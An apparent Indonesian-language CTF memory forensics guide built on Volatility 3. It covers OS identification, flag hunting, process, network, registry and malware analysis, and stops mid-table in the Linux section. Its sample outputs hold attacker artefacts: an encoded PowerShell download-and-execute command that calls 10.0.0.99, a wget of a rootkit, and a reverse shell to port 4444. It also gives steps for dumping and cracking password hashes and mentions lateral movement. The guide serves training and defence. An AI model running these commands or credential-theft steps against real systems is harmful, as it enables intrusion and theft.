# Raw string carving mencari pola flag format CTF
strings -a -e l mem.raw | grep -iE "flag\{|picoCTF\{|HTB\{"
```

### 5. Credential Extraction

Bash

```
# Ekstraksi NTLM password hash pengguna lokal
vol -f mem.raw windows.hashdump

# Ekstraksi rahasia LSA Secrets
vol -f mem.raw windows.lsadump

# Ekstraksi riwayat clipboard pengguna
vol -f mem.raw windows.clipboard

# Ekstraksi seluruh environment variables
vol -f mem.raw windows.envars
```

### 6. Malware & Code Injection Hunting

Bash

```
# Memindai injeksi kode VAD executable-readwrite
vol -f mem.raw windows.malfind

# Dump region kode yang terinjeksi ke folder
vol -f mem.raw -o ./malfind_dumps windows.malfind --dump

# Dump full memory space dari satu proses
vol -f mem.raw -o ./proc_dumps windows.memmap --dump --pid <PID>
```

### 7. Linux Memory Forensics

Bash

```
# Ekstraksi uncommitted / deleted bash history
vol -f mem.raw linux.bash

# Listing proses Linux
vol -f mem.raw linux.pslist

# Deteksi rootkit kernel module LKM tersembunyi
vol -f mem.raw linux.check_modules

# Ekstraksi file executable ELF dari memori proses
vol -f mem.raw -o ./elf_dumps linux.elfs --pid <PID>
```

---

## 🔗 Navigasi Workflow

### ← File Sebelumnya
**[File 57: PCAP Analysis Workflow](/docs/pcap-analysis)**  
Network traffic = sumber bukti yang melengkapi memory dump. Jika memory dump menunjukkan koneksi jaringan mencurigakan (`windows.netscan` / `linux.netstat`), buka File 57 untuk rekonstruksi insiden secara utuh.

### → File Berikutnya  
**[File 59: Cloud Enum Workflow](/docs/cloud-enum)**  
Setelah menguasai forensics lokal (disk + memory + PCAP), lanjut ke forensics dan enumeration di environment cloud yang memiliki artifact berbeda (CloudTrail, S3 logs, metadata service).

**Kenapa File 59 Penting Setelah Ini?**  
Cloud instances tidak bisa di-dump RAM-nya secara langsung seperti VM lokal. Anda perlu mengetahui cara melakukan enumeration & forensic pada cloud environment (IAM, S3, metadata service, logs) sebelum melakukan analisis insiden di sana.

---

# [🧠 Bagian 0: Fondasi Memory Forensics](/docs/memory-forensics) — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah kecuali disebutkan.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export MEMDUMP="challenge.raw"    # Ganti dengan nama file memory dump kamu
mkdir -p ~/mem_loot/{dumps,creds,files,strings,malfind}
cd ~/mem_loot

echo "[*] Analyzing: $MEMDUMP"
echo "[*] Working dir: ~/mem_loot"

# Verifikasi Volatility tersedia
vol -h 2>/dev/null | head -3 || echo "[-] Volatility tidak ditemukan!"
volatility3 -h 2>/dev/null | head -3 || pip3 install volatility3
```

**Output yang diharapkan:**

text

```
[*] Analyzing: challenge.raw
[*] Working dir: ~/mem_loot
Volatility 3 Framework 2.x.x
```

**OUTPUT GAGAL ❌ — Volatility tidak ada:**

text

```
[-] Volatility tidak ditemukan!
```

➡️ Install dulu:

Bash

```
sudo pip3 install volatility3
# Atau dari source
cd /opt && sudo git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3 && sudo pip3 install -e .

# Buat alias permanen
echo "alias vol='volatility3'" >> ~/.bashrc
source ~/.bashrc
```

---

## ═══════════════════════════════════════

## FASE 0: IDENTIFIKASI FILE & OS

## ═══════════════════════════════════════

> **Tujuan:** Kenali dulu format dump dan OS-nya. SEMUA langkah berikutnya bergantung pada ini.

### Langkah 0.1 — Identifikasi Format File

Bash

```
# Command 1: Cek tipe file
file $MEMDUMP

# Command 2: Cek magic bytes (8 bytes pertama)
xxd $MEMDUMP | head -3

# Command 3: Ukuran file
ls -lh $MEMDUMP
```

**OUTPUT BERHASIL ✅ — Raw/DD dump (paling umum di CTF):**

text

```
challenge.raw: data
# Magic bytes: d4 c3 b2 a1 (PCAP) atau tidak ada header = raw memory
```

**OUTPUT BERHASIL ✅ — VMware dump:**

text

```
challenge.vmem: data
# Magic bytes biasanya tidak ada header spesifik
```

**OUTPUT BERHASIL ✅ — Windows crash dump:**

text

```
challenge.dmp: Mini DuMP crash report, 14 streams, Sat Oct 18...
```

➡️ Untuk crash dump `.dmp`, Volatility bisa langsung baca. Lanjut.

**OUTPUT BERHASIL ✅ — VirtualBox dump:**

text

```
challenge.elf: ELF 64-bit LSB core file
```

➡️ Convert dulu:

Bash

```
VBoxManage debugvm "VM_NAME" dumpvmcore --filename vm_memory.raw
export MEMDUMP="vm_memory.raw"
```

**OUTPUT BERHASIL ✅ — Hibernation file:**

text

```
hiberfil.sys
```

➡️ Convert hibernation ke raw:

Bash

```
# Gunakan volatility untuk convert
vol -f hiberfil.sys imagecopy -O output.raw
export MEMDUMP="output.raw"
```

---

### Langkah 0.2 — Identifikasi OS (PALING KRITIS)

Bash

```
# Command 1: Coba Windows info dulu (paling sering di CTF)
vol -f $MEMDUMP windows.info 2>/dev/null | tee ~/mem_loot/windows_info.txt

# Command 2: Jika gagal, cek Linux banner
strings -a $MEMDUMP | grep -E "Linux version [0-9]+\.[0-9]+" | head -3

# Command 3: Cek strings umum untuk identifikasi OS
strings -a $MEMDUMP | grep -iE "Windows|Linux|Darwin" | head -10
```

**OUTPUT BERHASIL ✅ — Windows terdeteksi:**

text

```
Variable          Value
Kernel Base       0xf80002852000
DTB               0x1aa000
Is64Bit           True
NtMajorVersion    10
NtMinorVersion    0
NtBuildNumber     19041
SystemTime        2023-10-18 14:28:11.000000
TimeZone          UTC
```

**Cara baca NtBuildNumber → versi Windows:**

|Build Number|Windows Version|
|---|---|
|2600|Windows XP|
|7601|Windows 7 SP1|
|9200|Windows 8|
|10240|Windows 10 1507|
|17763|Windows 10 1809 / Server 2019|
|19041|Windows 10 20H1|
|19045|Windows 10 22H2|
|22000|Windows 11|

Bash

```
# SIMPAN INFO PENTING
export OS_TYPE="windows"
export BUILD="19041"
export SYSTEM_TIME="2023-10-18 14:28:11"
echo "[*] Windows Build $BUILD | Capture time: $SYSTEM_TIME"
```

**OUTPUT BERHASIL ✅ — Linux terdeteksi:**

text

```
Linux version 5.10.0-8-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110) #1 SMP Debian 5.10.46-4 (2021-08-03)
```

Bash

```
export OS_TYPE="linux"
export KERNEL_VER="5.10.0-8-amd64"
echo "[*] Linux kernel: $KERNEL_VER"
```

➡️ **Linux → Langsung ke Fase 3 setelah setup symbol**

**OUTPUT GAGAL ❌ — Tidak ada output / error:**

text

```
Volatility was unable to find a valid DTB address
# atau
Unsatisfied requirement: plugins.windows.info.WindowsInfo
```

➡️ Kemungkinan masalah symbol. Coba:

Bash

```
# Option 1: Coba paksa dengan imageinfo (Volatility 2 style)
strings -a $MEMDUMP | grep -E "(Windows|Linux) version" | head -5

# Option 2: Cek apakah file rusak
xxd $MEMDUMP | head -5
wc -c $MEMDUMP   # ukuran dalam bytes, harusnya > 100MB

# Option 3: Download symbol pack
VOL_PATH=$(python3 -c "import volatility3, os; print(os.path.dirname(volatility3.__file__))")
sudo mkdir -p "$VOL_PATH/symbols/windows"
cd /tmp && wget https://downloads.volatilityfoundation.org/volatility3/symbols/windows.zip
sudo unzip -q windows.zip -d "$VOL_PATH/symbols/" && rm windows.zip
```

**Google search jika masih buntu:**

text

```
"volatility3 Unsatisfied requirement WindowsInfo" site:github.com
"volatility3 No suitable address space" fix
```

---

## ═══════════════════════════════════════

## FASE 1: QUICK FLAG HUNT (Sebelum Analisis Mendalam)

## ═══════════════════════════════════════

> **Lakukan INI DULU sebelum fase lain** — sering flag langsung ketemu dalam 2 menit!

### Langkah 1.1 — Raw String Search

Bash

```
# Command 1: Cari flag ASCII standar
strings -a $MEMDUMP | grep -iE "(flag|picoCTF|HTB|THM|CTF)\{[a-zA-Z0-9_!@#$%^&*-]+\}" | head -20

# Command 2: Cari flag Unicode (Windows menyimpan string sebagai UTF-16LE)
strings -a -e l $MEMDUMP | grep -iE "(flag|picoCTF|HTB|THM)\{" | head -20

# Command 3: Cari dengan offset (untuk investigasi lokasi di memory)
strings -a -td $MEMDUMP | grep -iE "flag\{" | head -10

# Command 4: Kombinasi kedua encoding
strings -a $MEMDUMP | grep -iE "flag\{" ; strings -a -e l $MEMDUMP | grep -iE "flag\{"
```

**OUTPUT BERHASIL ✅ — FLAG LANGSUNG DITEMUKAN:**

text

```
flag{memory_forensics_is_fun_2024}
picoCTF{w3_4r3_1n_m3m0ry}
HTB{r4m_d0nt_l13}
```

➡️ **SELESAI!** Submit flag.

**OUTPUT GAGAL ❌ — Tidak ada flag di strings:**

text

```
(kosong)
```

➡️ Flag mungkin di-encode atau tersembunyi dalam struktur memory. Lanjut ke fase berikutnya.

---

### Langkah 1.2 — Quick Triage Paralel

Bash

```
# Jalankan semua ini sekaligus (background) untuk hemat waktu
vol -f $MEMDUMP windows.pslist 2>/dev/null | tee ~/mem_loot/pslist.txt &
vol -f $MEMDUMP windows.cmdline 2>/dev/null | tee ~/mem_loot/cmdline.txt &
vol -f $MEMDUMP windows.netscan 2>/dev/null | tee ~/mem_loot/netscan.txt &
vol -f $MEMDUMP windows.filescan 2>/dev/null | grep -iE "flag|secret|password|desktop|downloads" | tee ~/mem_loot/files_interesting.txt &

wait
echo "[*] Quick triage selesai!"

# Cek hasilnya
echo "=== Files of Interest ===" && cat ~/mem_loot/files_interesting.txt
echo "=== Network Connections ===" && grep "ESTABLISHED" ~/mem_loot/netscan.txt
echo "=== Suspicious Commands ===" && grep -iE "enc|bypass|hidden|download" ~/mem_loot/cmdline.txt
```

---

## ═══════════════════════════════════════

## FASE 2: WINDOWS MEMORY FORENSICS

## ═══════════════════════════════════════

### Langkah 2.1 — Process Analysis (7 Langkah Wajib)

#### Step 2.1.1 — List Semua Proses

Bash

```
# Command 1: pslist (dari ActiveProcessLinks kernel)
vol -f $MEMDUMP windows.pslist | tee ~/mem_loot/pslist.txt

# Command 2: pstree (tampilkan hierarki)
vol -f $MEMDUMP windows.pstree | tee ~/mem_loot/pstree.txt

# Command 3: psscan (carving — bisa temukan hidden process)
vol -f $MEMDUMP windows.psscan | tee ~/mem_loot/psscan.txt
```

**OUTPUT BERHASIL ✅ — pslist normal:**

text

```
PID   PPID  ImageFileName    Offset(V)       Threads  SessionId  CreateTime
4     0     System           0xfa800163a040  96       N/A        2023-10-18 14:00:01
388   4     smss.exe         0xfa80026f8060  2        N/A        2023-10-18 14:00:02
524   516   csrss.exe        0xfa80028ab940  9        0          2023-10-18 14:00:05
672   600   services.exe     0xfa8002a24060  7        0          2023-10-18 14:00:07
704   600   lsass.exe        0xfa8002a45060  8        0          2023-10-18 14:00:07
3940  1420  WINWORD.EXE      0xfa8003ef1060  12       1          2023-10-18 14:18:30
5844  3940  powershell.exe   0xfa800412a060  11       1          2023-10-18 14:20:45
6112  5844  cmd.exe          0xfa8004b28010  3        1          2023-10-18 14:21:02
```

**Red Flags yang harus dicatat:**

|Process|Red Flag|Kenapa|
|---|---|---|
|`WINWORD.EXE` spawn `powershell.exe`|⚠️ ANOMALI|Normal: Word tidak spawn PowerShell|
|`powershell.exe` spawn `cmd.exe`|⚠️ ANOMALI|Pola malware dropper|
|`lsass.exe` parent bukan `wininit.exe`|⚠️ ANOMALI|Mungkin fake lsass|
|`svchost.exe` tanpa `-k` arg|⚠️ ANOMALI|Svchost asli selalu ada `-k`|
|Nama typo: `scvhost.exe`, `lsas.exe`|⚠️ KRITIS|Masquerading malware|

Bash

```
# Bandingkan pslist vs psscan untuk temukan hidden process (rootkit)
diff <(awk '{print $1,$3}' ~/mem_loot/pslist.txt | sort) \
     <(awk '{print $1,$3}' ~/mem_loot/psscan.txt | sort) | grep "^>"
```

**OUTPUT BERHASIL ✅ — Hidden process ditemukan:**

text

```
> 2840 malware.exe    ← Ada di psscan tapi TIDAK ada di pslist = HIDDEN!
```

➡️ Process ini tersembunyi oleh rootkit (DKOM). Catat PID-nya.

---

#### Step 2.1.2 — Command Line Analysis (KRITIS!)

Bash

```
# Lihat semua command line arguments
vol -f $MEMDUMP windows.cmdline | tee ~/mem_loot/cmdline_full.txt

# Filter yang mencurigakan
grep -iE "(-enc|-EncodedCommand|-w hidden|bypass|downloadstring|iex|invoke)" ~/mem_loot/cmdline_full.txt
```

**OUTPUT BERHASIL ✅ — PowerShell encoded command:**

text

```
PID   Process          Args
5844  powershell.exe   powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA5ADkAOgA4ADAAOAAwAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==
```

➡️ Decode base64 (PowerShell pakai UTF-16LE!):

Bash

```
# Simpan string base64
B64="SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADAALgA5ADkAOgA4ADAAOAAwAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA=="

# Method 1: base64 + iconv
echo "$B64" | base64 -d | iconv -f UTF-16LE -t UTF-8 2>/dev/null

# Method 2: Python (lebih reliable)
python3 -c "import base64; print(base64.b64decode('$B64').decode('utf-16-le', errors='ignore'))"

# Method 3: strings pada decoded bytes
echo "$B64" | base64 -d | strings -e l
```

**OUTPUT BERHASIL ✅ — Decoded payload:**

text

```
IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.99:8080/payload.ps1')
```

➡️ Malware download payload dari `10.0.0.99:8080`. Catat IP ini sebagai C2.

**OUTPUT BERHASIL ✅ — Flag langsung di command:**

text

```
cmd.exe /c echo flag{found_in_cmdline_args} > C:\Users\victim\Desktop\flag.txt
```

➡️ **FLAG DITEMUKAN!**

---

#### Step 2.1.3 — Network Connections

Bash

```
# Lihat semua network connections
vol -f $MEMDUMP windows.netscan | tee ~/mem_loot/netscan_full.txt

# Filter yang aktif
grep "ESTABLISHED" ~/mem_loot/netscan_full.txt

# Filter reverse shell ports yang umum
grep -E "(4444|4445|1337|31337|9001|9002|8080|443)" ~/mem_loot/netscan_full.txt
```

**OUTPUT BERHASIL ✅ — Reverse shell terdeteksi:**

text

```
Offset      Proto   LocalAddr           LocalPort  ForeignAddr      ForeignPort  State        PID   Owner
0xfa8003a1  TCPv4   192.168.1.105       49300      10.0.0.99        4444         ESTABLISHED  5844  powershell.exe
0xfa8004b2  TCPv4   192.168.1.105       49210      185.199.108.153  443          ESTABLISHED  3940  WINWORD.EXE
```

**Cara baca dan tindakan:**

|State|Tindakan|
|---|---|
|`ESTABLISHED` ke port 4444/1337|⚠️ Reverse Shell! Catat PID dan IP|
|`ESTABLISHED` ke IP aneh port 443|Mungkin C2 via HTTPS|
|`LISTENING` port tinggi tidak biasa|Backdoor listener|

Bash

```
# Simpan C2 IP
export C2_IP="10.0.0.99"
echo "[*] C2 IP: $C2_IP | PID: 5844 (powershell.exe)"
```

---

#### Step 2.1.4 — File Scan & Recovery

Bash

```
# Scan semua file objects di memory
vol -f $MEMDUMP windows.filescan 2>/dev/null | tee ~/mem_loot/filescan_all.txt

# Cari file menarik
grep -iE "\.(flag|txt|kdbx|pdf|docx|xlsx|zip|7z|rar)" ~/mem_loot/filescan_all.txt | head -20
grep -iE "(flag|secret|password|credentials|key)" ~/mem_loot/filescan_all.txt | head -20
grep -iE "(Desktop|Downloads|Documents|AppData)" ~/mem_loot/filescan_all.txt | head -20
```

**OUTPUT BERHASIL ✅ — Flag file ditemukan:**

text

```
0xfa8003f42180    \Users\victim\Desktop\flag.txt
0xfa8004128910    \Users\victim\Downloads\invoice.docm
0xfa800455e230    \Users\victim\AppData\Roaming\Microsoft\Windows\Recent\passwords.docx
```

➡️ Dump file dari memory:

Bash

```
# Simpan virtual address
FLAG_ADDR="0xfa8003f42180"

# Method 1: dumpfiles via virtual address
mkdir -p ~/mem_loot/files/
vol -f $MEMDUMP -o ~/mem_loot/files/ windows.dumpfiles --virtaddr $FLAG_ADDR

# Cek isi file yang di-dump
ls -la ~/mem_loot/files/
cat ~/mem_loot/files/*.dat 2>/dev/null
strings ~/mem_loot/files/*.dat 2>/dev/null
```

**OUTPUT BERHASIL ✅ — File berhasil di-dump:**

text

```
flag{file_was_cached_in_memory_not_on_disk}
```

**OUTPUT GAGAL ❌ — File dump kosong (0 bytes):**

text

```
~/mem_loot/files/file.None.0xfa8003f42180.dat: 0 bytes
```

➡️ Page sudah di-swap atau overwritten. Coba carving langsung:

Bash

```
# Coba dengan PID proses yang membuka file
# Cari PID yang terkait
grep -i "flag.txt" ~/mem_loot/cmdline_full.txt

# Carve dari raw memory menggunakan foremost
foremost -i $MEMDUMP -t txt,pdf,docx -o ~/mem_loot/foremost_carve/
```

---

#### Step 2.1.5 — Credential Extraction

Bash

```
# Method 1: NTLM hash dump (SAM database)
vol -f $MEMDUMP windows.hashdump | tee ~/mem_loot/creds/ntlm_hashes.txt
```

**OUTPUT BERHASIL ✅:**

text

```
User          rid   lmhash                            nthash
Administrator 500   aad3b435b51404eeaad3b435b51404ee  31d6cfe0d16ae931b73c59d7e0c089c0
victim        1000  aad3b435b51404eeaad3b435b51404ee  8846f7eaee8fb117ad06bdd830b7586c
```

➡️ Crack NTLM hash:

Bash

```
# Simpan hash
echo "8846f7eaee8fb117ad06bdd830b7586c" > ~/mem_loot/creds/ntlm.hash

# Crack dengan hashcat (mode 1000 = NTLM)
hashcat -m 1000 ~/mem_loot/creds/ntlm.hash /usr/share/wordlists/rockyou.txt

# Atau langsung cek di crackstation.net (faster untuk CTF)
echo "[*] Check: https://crackstation.net/ | Hash: 8846f7eaee8fb117ad06bdd830b7586c"

# Atau dengan john
echo "victim:8846f7eaee8fb117ad06bdd830b7586c" > hash_john.txt
john hash_john.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=NT
```

**OUTPUT BERHASIL ✅ — Hash cracked:**

text

```
8846f7eaee8fb117ad06bdd830b7586c:password    (victim)
```

Bash

```
# Method 2: LSA Secrets
vol -f $MEMDUMP windows.lsadump | tee ~/mem_loot/creds/lsa_secrets.txt

# Method 3: Cached credentials
vol -f $MEMDUMP windows.cachedump | tee ~/mem_loot/creds/cached_creds.txt
```

**OUTPUT BERHASIL ✅ — LSA secrets:**

text

```
$MACHINE.ACC   Plaintext: SecretMachinePass123!
DefaultPassword Plaintext: Admin@2024!
```

➡️ Credentials ini bisa dipakai untuk lateral movement → **<a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>**

---

#### Step 2.1.6 — Malware Detection (malfind)

Bash

```
# Scan VAD regions yang mencurigakan
vol -f $MEMDUMP windows.malfind | tee ~/mem_loot/malfind_results.txt

# Dump semua injected regions
mkdir -p ~/mem_loot/malfind/
vol -f $MEMDUMP -o ~/mem_loot/malfind/ windows.malfind --dump 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Injeksi kode terdeteksi:**

text

```
PID   Process      ProcessAddress     Protection              Tag   Output
792   svchost.exe  0x00000000002a0000 PAGE_EXECUTE_READWRITE  VadS
0x00000000002a0000  4d 5a 90 00 03 00 00 00  MZ..............
```

**Interpretasi:**

- `PAGE_EXECUTE_READWRITE` = region yang bisa ditulis DAN dieksekusi = SUSPICIOUS
- Header `4d 5a` = `MZ` = Windows PE header = ada executable di-inject
- Proses: `svchost.exe` tapi ada PE lain di dalamnya = **Process Hollowing**

Bash

```
# Analisis file yang di-dump
for f in ~/mem_loot/malfind/pid.*.dmp 2>/dev/null; do
    echo "=== $f ==="
    file "$f"
    # Cari flag di setiap dump
    strings -a "$f" | grep -iE "flag\{|picoCTF|HTB\{" | head -5
    # Cari strings menarik
    strings -a -e l "$f" | grep -iE "(password|credential|key|flag)" | head -5
done
```

**OUTPUT BERHASIL ✅ — Flag di injected code:**

text

```
=== ~/mem_loot/malfind/pid.792.0x2a0000.dmp ===
data
flag{process_hollowing_detected_2024}
```

**OUTPUT GAGAL ❌ — Strings tidak menemukan flag:**

text

```
(kosong)
```

➡️ Mungkin flag di-encode dalam binary. Lakukan reverse engineering:

Bash

```
# Analyze dengan Ghidra (jika binary valid)
# Cek dulu apakah valid PE/ELF
file ~/mem_loot/malfind/pid.*.dmp

# Jika MZ header valid → analisis dengan strings lebih dalam
strings -a ~/mem_loot/malfind/pid.792.*.dmp | head -50

# Google: "volatility malfind MZ header CTF" untuk hints spesifik
```

---

#### Step 2.1.7 — Clipboard & Environment Variables

Bash

```
# Clipboard (handal untuk Windows XP/7/8, kadang kosong di Win10/11)
vol -f $MEMDUMP windows.clipboard | tee ~/mem_loot/clipboard.txt

# Environment variables (sering ada flag di sini)
vol -f $MEMDUMP windows.envars | grep -iE "(flag|secret|token|api|key|pass)" | tee ~/mem_loot/envars_flagged.txt

# Semua envars untuk proses mencurigakan
vol -f $MEMDUMP windows.envars | grep -iE "CTF|HTB|PICO" | head -10
```

**OUTPUT BERHASIL ✅ — Flag di clipboard:**

text

```
Session  WindowStation  Type    Name  Data
1        WinSta0        CF_TEXT None  flag{clipboard_data_never_safe_2024}
```

**OUTPUT BERHASIL ✅ — Flag di environment variable:**

text

```
PID   Process     Variable    Value
3940  WINWORD.EXE FLAG        HTB{3nv_v4rs_4r3_n0t_h1dd3n}
```

**OUTPUT GAGAL ❌ — Clipboard kosong (Windows 10/11):**

text

```
(tidak ada output)
```

➡️ Windows 10/11 clipboard berbeda. Alternatif:

Bash

```
# Dump memory explorer.exe lalu cari string
EXPLORER_PID=$(grep "explorer.exe" ~/mem_loot/pslist.txt | awk '{print $1}')
echo "Explorer PID: $EXPLORER_PID"

mkdir -p ~/mem_loot/dumps/
vol -f $MEMDUMP -o ~/mem_loot/dumps/ windows.memmap --dump --pid $EXPLORER_PID 2>/dev/null

# Cari flag di memory dump explorer
strings -a -e l ~/mem_loot/dumps/pid.$EXPLORER_PID.dmp | grep -iE "flag\{|CTF\{" | head -10
```

---

### Langkah 2.2 — Registry Analysis (Persistence Hunting)

Bash

```
# List semua registry hives di memory
vol -f $MEMDUMP windows.registry.hivelist | tee ~/mem_loot/hivelist.txt

# Cek autorun keys (persistence mechanism)
vol -f $MEMDUMP windows.registry.printkey \
    --key "Software\Microsoft\Windows\CurrentVersion\Run" 2>/dev/null | tee ~/mem_loot/registry_run.txt

# Cek RunOnce
vol -f $MEMDUMP windows.registry.printkey \
    --key "Software\Microsoft\Windows\CurrentVersion\RunOnce" 2>/dev/null

# Cek Services (malware sering buat service)
vol -f $MEMDUMP windows.registry.printkey \
    --key "System\CurrentControlSet\Services" 2>/dev/null | grep -iE "(evil|malware|backdoor|shell)" | head -10

# User Assist (aplikasi yang pernah dijalankan)
vol -f $MEMDUMP windows.registry.userassist 2>/dev/null | tee ~/mem_loot/userassist.txt
```

**OUTPUT BERHASIL ✅ — Malware persistence ditemukan:**

text

```
Key: Software\Microsoft\Windows\CurrentVersion\Run
  Name: Updater
  Data: C:\Users\victim\AppData\Local\Temp\malware.exe
  Type: REG_SZ
```

➡️ Malware set autorun! Catat path-nya untuk dump binary.

---

### Langkah 2.3 — DLL Injection Analysis

Bash

```
# List DLL untuk proses mencurigakan (PID dari malfind/pstree)
SUSP_PID=5844

vol -f $MEMDUMP windows.dlllist --pid $SUSP_PID | tee ~/mem_loot/dlllist_pid$SUSP_PID.txt

# Cari DLL yang dimuat dari path mencurigakan
grep -iE "(temp|tmp|appdata|users\\\\public|downloads)" ~/mem_loot/dlllist_pid$SUSP_PID.txt
```

**OUTPUT BERHASIL ✅ — Suspicious DLL:**

text

```
PID   Process       Base       Size  Name                Path
5844  powershell.exe 0x7ff...   65536  evil.dll            C:\Users\victim\AppData\Local\Temp\evil.dll
```

➡️ DLL di-load dari Temp = Reflective DLL Injection atau sideloading!

---

### Langkah 2.4 — Dump Process Memory untuk Analisis Mendalam

Bash

```
# Dump full memory dari proses mencurigakan
mkdir -p ~/mem_loot/proc_dumps/
vol -f $MEMDUMP -o ~/mem_loot/proc_dumps/ windows.memmap --dump --pid $SUSP_PID 2>/dev/null

# Cari flag/credentials di process memory
strings -a -e l ~/mem_loot/proc_dumps/pid.$SUSP_PID.dmp | grep -iE "flag\{|picoCTF|HTB\{" | head -10
strings -a -e l ~/mem_loot/proc_dumps/pid.$SUSP_PID.dmp | grep -iE "password\s*[=:]\s*\S+" | head -10

# Dump browser memory (jika ada Chrome/Firefox)
CHROME_PIDS=$(grep -i "chrome.exe" ~/mem_loot/pslist.txt | awk '{print $1}')
for pid in $CHROME_PIDS; do
    echo "Dumping Chrome PID: $pid"
    vol -f $MEMDUMP -o ~/mem_loot/proc_dumps/ windows.memmap --dump --pid $pid 2>/dev/null
    strings -a -e l ~/mem_loot/proc_dumps/pid.$pid.dmp | grep -iE "password|flag\{" | head -5
done
```

---

## ═══════════════════════════════════════

## FASE 3: LINUX MEMORY FORENSICS

## ═══════════════════════════════════════

> **Masuk sini jika:** OS terdeteksi Linux (dari Langkah 0.2)

### Langkah 3.1 — Setup Symbol Table (WAJIB untuk Linux)

Bash

```
# Step 1: Identifikasi versi kernel dari memory dump
KERNEL_VER=$(strings -a $MEMDUMP | grep -E "Linux version [0-9]+\.[0-9]+" | head -1 | awk '{print $3}')
echo "[*] Kernel version: $KERNEL_VER"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Kernel version: 5.10.0-8-amd64
```

Bash

```
# Step 2: Coba langsung dulu (mungkin symbol sudah ada)
vol -f $MEMDUMP linux.pslist 2>/dev/null | head -5
```

**OUTPUT BERHASIL ✅ — Langsung berhasil:**

text

```
PID   PPID   COMM      OFFSET              UID   GID
1     0      systemd   0xffff88007c018000  0     0
2     0      kthreadd  0xffff88007c019000  0     0
```

➡️ Symbol sudah ada. Lanjut ke **Langkah 3.2**.

**OUTPUT GAGAL ❌ — No suitable kernel symbols:**

text

```
Volatility 3 Framework 2.x.x
No suitable kernel found for this address space
```

➡️ Perlu buat symbol table sendiri:

Bash

```
# Option 1: Download pre-built symbols (paling cepat)
VOL_PATH=$(python3 -c "import volatility3, os; print(os.path.dirname(volatility3.__file__))")
sudo mkdir -p "$VOL_PATH/symbols/linux"

# Cari di: https://github.com/Abyss-W4tcher/volatility3-symbols
# atau: https://isf-server.techanarchy.net/

# Option 2: Buat sendiri dengan dwarf2json (butuh kernel yang sama)
sudo apt install -y golang linux-image-${KERNEL_VER}-dbg 2>/dev/null

cd /opt/dwarf2json 2>/dev/null || (cd /opt && sudo git clone https://github.com/volatilityfoundation/dwarf2json.git && cd dwarf2json && sudo go build)

sudo /opt/dwarf2json/dwarf2json linux \
    --elf /usr/lib/debug/boot/vmlinux-${KERNEL_VER} \
    --system-map /boot/System.map-${KERNEL_VER} \
    > /tmp/linux-${KERNEL_VER}.json

sudo cp /tmp/linux-${KERNEL_VER}.json "$VOL_PATH/symbols/linux/"

# Verifikasi
vol -f $MEMDUMP linux.pslist | head -5
```

**Google search jika buntu:**

text

```
"volatility3 linux symbols" site:github.com
"volatility3-symbols" linux kernel version download
site:isf-server.techanarchy.net volatility symbols linux
```

---

### Langkah 3.2 — Linux Process & Network Analysis

Bash

```
# 7 plugin utama Linux (jalankan semua)
vol -f $MEMDUMP linux.pslist | tee ~/mem_loot/linux_pslist.txt
vol -f $MEMDUMP linux.pstree | tee ~/mem_loot/linux_pstree.txt
vol -f $MEMDUMP linux.netstat | tee ~/mem_loot/linux_netstat.txt
vol -f $MEMDUMP linux.bash | tee ~/mem_loot/linux_bash.txt
vol -f $MEMDUMP linux.lsof | tee ~/mem_loot/linux_lsof.txt
vol -f $MEMDUMP linux.check_modules | tee ~/mem_loot/linux_modules.txt
vol -f $MEMDUMP linux.malfind | tee ~/mem_loot/linux_malfind.txt
```

---

### Langkah 3.3 — Bash History Recovery (SERING ADA FLAG!)

Bash

```
# Ekstrak bash history dari RAM
vol -f $MEMDUMP linux.bash | tee ~/mem_loot/bash_history.txt
```

**OUTPUT BERHASIL ✅ — Bash history ditemukan:**

text

```
PID   Process  CommandTime              Command
1820  bash     2023-10-18 15:10:02      cd /tmp
1820  bash     2023-10-18 15:10:14      wget http://10.0.0.99/rootkit.ko
1820  bash     2023-10-18 15:10:20      insmod rootkit.ko
1820  bash     2023-10-18 15:11:05      echo "flag{b4sh_h1st0ry_1n_r4m}" > /root/flag.txt
1820  bash     2023-10-18 15:11:45      history -c && unset HISTFILE
```

➡️ **FLAG DITEMUKAN di bash history!**

**Tindakan dari bash history:**

- `wget http://10.0.0.99/rootkit.ko` → C2 IP adalah `10.0.0.99`
- `insmod rootkit.ko` → Rootkit kernel module dimuat!
- `history -c && unset HISTFILE` → Attacker mencoba hapus jejak

**OUTPUT GAGAL ❌ — Tidak ada output:**

text

```
(kosong)
```

➡️ Bash history mungkin sudah dihapus dari heap. Cari di strings:

Bash

```
strings -a $MEMDUMP | grep -iE "echo.*flag|cat.*flag|flag\{" | head -10
strings -a $MEMDUMP | grep -E "(wget|curl|nc|netcat|python.*-c)" | grep -v "^#" | head -20
```

---

### Langkah 3.4 — Linux Network & Rootkit Detection

Bash

```
# Network connections
vol -f $MEMDUMP linux.netstat | tee ~/mem_loot/linux_netstat.txt
grep "ESTABLISHED" ~/mem_loot/linux_netstat.txt
```

**OUTPUT BERHASIL ✅ — Reverse shell aktif:**

text

```
State        Recv-Q  Send-Q  Local Address         Foreign Address     PID/Process
